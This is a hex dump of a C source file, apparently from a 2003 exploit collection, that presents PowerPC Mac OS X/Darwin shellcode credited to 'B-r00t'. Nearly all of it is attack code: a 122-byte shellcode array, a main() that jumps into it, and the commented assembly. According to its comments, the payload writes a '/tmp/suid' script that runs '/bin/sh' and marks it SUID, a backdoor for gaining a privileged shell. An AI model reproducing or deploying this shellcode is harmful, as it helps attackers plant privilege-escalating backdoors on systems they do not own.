00000000  2f 2a 0d 0a 50 50 43 20  4f 53 58 2f 44 61 72 77  |/*..PPC OSX/Darw|
00000010  69 6e 20 53 68 65 6c 6c  63 6f 64 65 20 62 79 20  |in Shellcode by |
00000020  42 2d 72 30 30 74 2e 20  32 30 30 33 2e 0d 0a 44  |B-r00t. 2003...D|
00000030  6f 65 73 20 6f 70 65 6e  28 29 3b 20 77 72 69 74  |oes open(); writ|
00000040  65 28 29 3b 20 63 6c 6f  73 65 28 29 3b 20 65 78  |e(); close(); ex|
00000050  69 74 28 29 3b 0d 0a 53  65 65 20 41 53 4d 20 62  |it();..See ASM b|
00000060  65 6c 6f 77 2e 0d 0a 31  32 32 20 42 79 74 65 73  |elow...122 Bytes|
00000070  2e 0d 0a 2a 2f 0d 0a 0d  0a 63 68 61 72 20 73 68  |...*/....char sh|
00000080  65 6c 6c 63 6f 64 65 5b  5d 20 3d 0d 0a 22 5c 78  |ellcode[] =.."\x|
00000090  37 63 5c 78 61 35 5c 78  32 61 5c 78 37 39 5c 78  |7c\xa5\x2a\x79\x|
000000a0  34 30 5c 78 38 32 5c 78  66 66 5c 78 66 64 22 0d  |40\x82\xff\xfd".|
000000b0  0a 22 5c 78 37 66 5c 78  65 38 5c 78 30 32 5c 78  |."\x7f\xe8\x02\x|
000000c0  61 36 5c 78 33 39 5c 78  31 66 5c 78 30 31 5c 78  |a6\x39\x1f\x01\x|
000000d0  37 31 22 0d 0a 22 5c 78  33 39 5c 78 30 38 5c 78  |71".."\x39\x08\x|
000000e0  66 65 5c 78 66 34 5c 78  37 63 5c 78 61 38 5c 78  |fe\xf4\x7c\xa8\x|
000000f0  32 39 5c 78 61 65 22 0d  0a 22 5c 78 33 38 5c 78  |29\xae".."\x38\x|
00000100  37 66 5c 78 30 31 5c 78  36 38 5c 78 33 38 5c 78  |7f\x01\x68\x38\x|
00000110  36 33 5c 78 66 65 5c 78  66 34 22 0d 0a 22 5c 78  |63\xfe\xf4".."\x|
00000120  33 38 5c 78 38 30 5c 78  30 32 5c 78 30 31 5c 78  |38\x80\x02\x01\x|
00000130  33 38 5c 78 61 30 5c 78  66 66 5c 78 66 66 22 0d  |38\xa0\xff\xff".|
00000140  0a 22 5c 78 33 39 5c 78  34 30 5c 78 30 31 5c 78  |."\x39\x40\x01\x|
00000150  37 30 5c 78 33 38 5c 78  30 61 5c 78 66 65 5c 78  |70\x38\x0a\xfe\x|
00000160  39 35 22 0d 0a 22 5c 78  34 34 5c 78 66 66 5c 78  |95".."\x44\xff\x|
00000170  66 66 5c 78 30 32 5c 78  36 30 5c 78 36 30 5c 78  |ff\x02\x60\x60\x|
00000180  36 30 5c 78 36 30 22 0d  0a 22 5c 78 33 38 5c 78  |60\x60".."\x38\x|
00000190  39 66 5c 78 30 31 5c 78  37 32 5c 78 33 38 5c 78  |9f\x01\x72\x38\x|
000001a0  38 34 5c 78 66 65 5c 78  66 34 22 0d 0a 22 5c 78  |84\xfe\xf4".."\x|
000001b0  33 38 5c 78 61 61 5c 78  66 65 5c 78 39 63 5c 78  |38\xaa\xfe\x9c\x|
000001c0  33 38 5c 78 30 61 5c 78  66 65 5c 78 39 34 22 0d  |38\x0a\xfe\x94".|
000001d0  0a 22 5c 78 34 34 5c 78  66 66 5c 78 66 66 5c 78  |."\x44\xff\xff\x|
000001e0  30 32 5c 78 36 30 5c 78  36 30 5c 78 36 30 5c 78  |02\x60\x60\x60\x|
000001f0  36 30 22 0d 0a 22 5c 78  33 38 5c 78 30 61 5c 78  |60".."\x38\x0a\x|
00000200  66 65 5c 78 39 36 5c 78  34 34 5c 78 66 66 5c 78  |fe\x96\x44\xff\x|
00000210  66 66 5c 78 30 32 22 0d  0a 22 5c 78 36 30 5c 78  |ff\x02".."\x60\x|
00000220  36 30 5c 78 36 30 5c 78  36 30 5c 78 33 38 5c 78  |60\x60\x60\x38\x|
00000230  30 61 5c 78 66 65 5c 78  39 31 22 0d 0a 22 5c 78  |0a\xfe\x91".."\x|
00000240  34 34 5c 78 66 66 5c 78  66 66 5c 78 30 32 5c 78  |44\xff\xff\x02\x|
00000250  32 66 5c 78 37 34 5c 78  36 64 5c 78 37 30 22 0d  |2f\x74\x6d\x70".|
00000260  0a 22 5c 78 32 66 5c 78  37 33 5c 78 37 35 5c 78  |."\x2f\x73\x75\x|
00000270  36 39 5c 78 36 34 5c 78  35 38 5c 78 32 33 5c 78  |69\x64\x58\x23\x|
00000280  32 31 22 0d 0a 22 5c 78  32 66 5c 78 36 32 5c 78  |21".."\x2f\x62\x|
00000290  36 39 5c 78 36 65 5c 78  32 66 5c 78 37 33 5c 78  |69\x6e\x2f\x73\x|
000002a0  36 38 5c 78 30 61 22 0d  0a 22 5c 78 37 33 5c 78  |68\x0a".."\x73\x|
000002b0  36 38 22 3b 0d 0a 0d 0a  69 6e 74 20 6d 61 69 6e  |68";....int main|
000002c0  20 28 76 6f 69 64 29 20  0d 0a 7b 0d 0a 20 20 20  | (void) ..{..   |
000002d0  20 20 20 20 20 5f 5f 61  73 6d 5f 5f 28 22 62 20  |     __asm__("b |
000002e0  5f 73 68 65 6c 6c 63 6f  64 65 22 29 3b 0d 0a 7d  |_shellcode");..}|
000002f0  0d 0a 0d 0a 2f 2a 0d 0a  3b 20 50 50 43 20 4f 53  |..../*..; PPC OS|
00000300  20 58 20 2f 20 44 61 72  77 69 6e 20 53 68 65 6c  | X / Darwin Shel|
00000310  6c 63 6f 64 65 20 62 79  20 42 2d 72 30 30 74 2e  |lcode by B-r00t.|
00000320  20 0d 0a 3b 20 6f 70 65  6e 28 29 3b 20 77 72 69  | ..; open(); wri|
00000330  74 65 28 29 3b 20 63 6c  6f 73 65 28 29 3b 20 65  |te(); close(); e|
00000340  78 69 74 28 29 0d 0a 3b  20 43 72 65 61 74 65 73  |xit()..; Creates|
00000350  20 61 6e 20 53 55 49 44  20 27 2f 74 6d 70 2f 73  | an SUID '/tmp/s|
00000360  75 69 64 27 20 74 6f 20  65 78 65 63 75 74 65 20  |uid' to execute |
00000370  27 2f 62 69 6e 2f 73 68  27 2e 0d 0a 3b 0d 0a 2e  |'/bin/sh'...;...|
00000380  67 6c 6f 62 6c 20 5f 6d  61 69 6e 0d 0a 2e 74 65  |globl _main...te|
00000390  78 74 0d 0a 5f 6d 61 69  6e 3a 0d 0a 20 20 20 20  |xt.._main:..    |
000003a0  20 20 20 20 78 6f 72 2e  20 20 20 20 72 35 2c 20  |    xor.    r5, |
000003b0  72 35 2c 20 72 35 0d 0a  20 20 20 20 20 20 20 20  |r5, r5..        |
000003c0  62 6e 65 6c 20 20 20 20  5f 6d 61 69 6e 20 20 20  |bnel    _main   |
000003d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003e0  20 0d 0a 20 20 20 20 20  20 20 20 6d 66 6c 72 20  | ..        mflr |
000003f0  20 20 20 72 33 31 0d 0a  20 20 20 20 20 20 20 20  |   r31..        |
00000400  61 64 64 69 20 20 20 20  72 38 2c 20 72 33 31 2c  |addi    r8, r31,|
00000410  20 32 36 38 2b 39 32 2b  39 0d 0a 20 20 20 20 20  | 268+92+9..     |
00000420  20 20 20 61 64 64 69 20  20 20 20 72 38 2c 20 72  |   addi    r8, r|
00000430  38 2c 20 2d 32 36 38 20  20 20 20 0d 0a 20 20 20  |8, -268    ..   |
00000440  20 20 20 20 20 73 74 62  78 20 20 20 20 72 35 2c  |     stbx    r5,|
00000450  20 72 38 2c 20 72 35 0d  0a 20 20 20 20 20 20 20  | r8, r5..       |
00000460  20 61 64 64 69 20 20 20  20 72 33 2c 20 72 33 31  | addi    r3, r31|
00000470  2c 20 32 36 38 2b 39 32  0d 0a 20 20 20 20 20 20  |, 268+92..      |
00000480  20 20 61 64 64 69 20 20  20 20 72 33 2c 20 72 33  |  addi    r3, r3|
00000490  2c 20 2d 32 36 38 0d 0a  20 20 20 20 20 20 20 20  |, -268..        |
000004a0  6c 69 20 20 20 20 20 20  72 34 2c 20 35 31 33 0d  |li      r4, 513.|
000004b0  0a 20 20 20 20 20 20 20  20 6c 69 20 20 20 20 20  |.        li     |
000004c0  20 72 35 2c 20 2d 31 20  20 0d 0a 20 20 20 20 20  | r5, -1  ..     |
000004d0  20 20 20 6c 69 20 20 20  20 20 20 72 31 30 2c 20  |   li      r10, |
000004e0  33 36 38 0d 0a 20 20 20  20 20 20 20 20 61 64 64  |368..        add|
000004f0  69 20 20 20 20 72 30 2c  20 72 31 30 2c 20 2d 33  |i    r0, r10, -3|
00000500  36 33 0d 0a 20 20 20 20  20 20 20 20 2e 6c 6f 6e  |63..        .lon|
00000510  67 20 20 20 30 78 34 34  66 66 66 66 30 32 0d 0a  |g   0x44ffff02..|
00000520  20 20 20 20 20 20 20 20  2e 6c 6f 6e 67 20 20 20  |        .long   |
00000530  30 78 36 30 36 30 36 30  36 30 0d 0a 20 20 20 20  |0x60606060..    |
00000540  20 20 20 20 61 64 64 69  20 20 20 20 72 34 2c 20  |    addi    r4, |
00000550  72 33 31 2c 20 32 36 38  2b 39 32 2b 31 30 0d 0a  |r31, 268+92+10..|
00000560  20 20 20 20 20 20 20 20  61 64 64 69 20 20 20 20  |        addi    |
00000570  72 34 2c 20 72 34 2c 20  2d 32 36 38 0d 0a 20 20  |r4, r4, -268..  |
00000580  20 20 20 20 20 20 61 64  64 69 20 20 20 20 72 35  |      addi    r5|
00000590  2c 20 72 31 30 2c 20 2d  33 35 36 0d 0a 20 20 20  |, r10, -356..   |
000005a0  20 20 20 20 20 61 64 64  69 20 20 20 20 72 30 2c  |     addi    r0,|
000005b0  20 72 31 30 2c 20 2d 33  36 34 0d 0a 20 20 20 20  | r10, -364..    |
000005c0  20 20 20 20 2e 6c 6f 6e  67 20 20 20 30 78 34 34  |    .long   0x44|
000005d0  66 66 66 66 30 32 0d 0a  20 20 20 20 20 20 20 20  |ffff02..        |
000005e0  2e 6c 6f 6e 67 20 20 20  30 78 36 30 36 30 36 30  |.long   0x606060|
000005f0  36 30 0d 0a 20 20 20 20  20 20 20 20 61 64 64 69  |60..        addi|
00000600  20 20 20 20 72 30 2c 20  72 31 30 2c 20 2d 33 36  |    r0, r10, -36|
00000610  32 0d 0a 20 20 20 20 20  20 20 20 2e 6c 6f 6e 67  |2..        .long|
00000620  20 20 20 30 78 34 34 66  66 66 66 30 32 20 20 20  |   0x44ffff02   |
00000630  20 20 20 0d 0a 20 20 20  20 20 20 20 20 2e 6c 6f  |   ..        .lo|
00000640  6e 67 20 20 20 30 78 36  30 36 30 36 30 36 30 0d  |ng   0x60606060.|
00000650  0a 20 20 20 20 20 20 20  20 61 64 64 69 20 20 20  |.        addi   |
00000660  20 72 30 2c 20 72 31 30  2c 20 2d 33 36 37 0d 0a  | r0, r10, -367..|
00000670  20 20 20 20 20 20 20 20  2e 6c 6f 6e 67 20 20 20  |        .long   |
00000680  30 78 34 34 66 66 66 66  30 32 0d 0a 70 61 74 68  |0x44ffff02..path|
00000690  3a 20 20 20 2e 61 73 63  69 7a 20 20 22 2f 74 6d  |:   .asciz  "/tm|
000006a0  70 2f 73 75 69 64 58 23  21 2f 62 69 6e 2f 73 68  |p/suidX#!/bin/sh|
000006b0  5c 6e 73 68 22 0d 0a 0d  0a 2a 2f                 |\nsh"....*/|
000006bb
